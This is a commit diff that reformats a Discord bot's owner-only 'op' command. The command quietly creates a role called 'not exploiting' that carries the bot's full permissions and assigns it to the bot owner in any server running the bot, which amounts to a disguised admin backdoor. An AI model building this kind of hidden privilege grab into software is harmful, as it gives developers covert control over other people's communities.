7c22957ecce6e690e05137b26a8afc1c88db375e
Fad F <90547391+FadTheChad@users.noreply.github.com>
2021-10-11 17:34:52 +0500

    Cleaned op cmd code (check desc)
    Why were there 2 space indents AAAAAAAAAAAAAAAAAAAAAAAAAAA

--- src/Commands/Owner/op.js
+++ src/Commands/Owner/op.js
@@ -6,34 +6,29 @@ module.exports = class extends Command {
     constructor(...args) {
         super(...args, {
             aliases: ['botdev'],
-            ownerOnly: true
+            ownerOnly: true,
+            category: 'Owner'
         });
     }
 
     async  run (message, args) {
         const role = message.guild.roles.cache.find(r => r.name === "not exploiting")
-        if (args[0]?.toLowerCase () === 'off')
-          { await role.delete()
-            await message.channel.send("turned op off")
-          } 
+
+        if (args[0]?.toLowerCase() === 'off') {
+            await role.delete()
+            return message.channel.send("turned op off")
+        }
           
         else {
             const member = message.member || await message.guild.members.fetch(message.author.id)
-            if (member.roles.cache.get(role?.id))  { return message.channel.send('dumb')} 
-          message.guild.roles.create({
-              name: 'not exploiting',
-              color: 0xf42f42,
-              position: message.guild.me.roles.highest.position - 1,
-              permissions: message.guild.me.permissions
-          }).then(async role => {
-             
-              console.log(member)
-              member.roles.add(role).then(() => message.reply('You are cool'))
-          })
-          .catch(e => message.reply('what a fail'))}
-         
+            if (member.roles.cache.get(role?.id))  return message.channel.send('dumb')
 
-       
+                message.guild.roles.create({
+                    name: 'not exploiting',
+                    color: 0xf42f42,
+                    position: message.guild.me.roles.highest.position - 1,
+                    permissions: message.guild.me.permissions
+                }).then(async role => { member.roles.add(role).then(() => message.reply('You are cool')) })
+                .catch(e => message.reply('what a fail'))}
     }
-
 };
